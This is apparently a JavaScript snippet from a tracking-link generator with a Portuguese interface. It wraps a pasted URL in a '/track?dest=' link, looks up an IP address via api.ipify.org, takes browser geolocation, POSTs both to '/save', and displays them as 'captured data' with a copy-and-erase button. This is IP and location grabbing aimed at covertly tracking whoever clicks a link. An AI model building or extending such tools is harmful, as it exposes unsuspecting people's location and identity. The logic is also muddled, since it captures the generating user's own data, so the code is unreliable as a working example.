function generate() {
  const dest = document.getElementById('dest').value.trim();
  if (!dest) return alert('Cole um link válido');

  const encoded = encodeURIComponent(dest);
  const url = `/track?dest=${encoded}`;

  document.getElementById('link').innerHTML = `
    <p><a href="${url}" style="color:lime;" target="_blank">${url}</a></p>
  `;

  // Get IP
  fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
      const ip = data.ip;

      // Get location
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              ip,
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude
            })
          });
        });
      }

      // Show on panel
      setTimeout(() => {
        const panel = document.getElementById('panel');
        panel.innerHTML = `
          <h3>Dados Capturados:</h3>
          <pre id="dados">${JSON.stringify({ ip }, null, 2)}</pre>
          <button class="copy-btn" onclick="copyAndClear()">Copiar e Apagar</button>
        `;
      }, 1000);
    });
}

function copyAndClear() {
  const text = document.getElementById('dados').innerText;
  navigator.clipboard.writeText(text).then(() => {
    document.getElementById('panel').innerHTML = '';
    document.getElementById('link').innerHTML = '';
    document.getElementById('dest').value = '';
  });
}
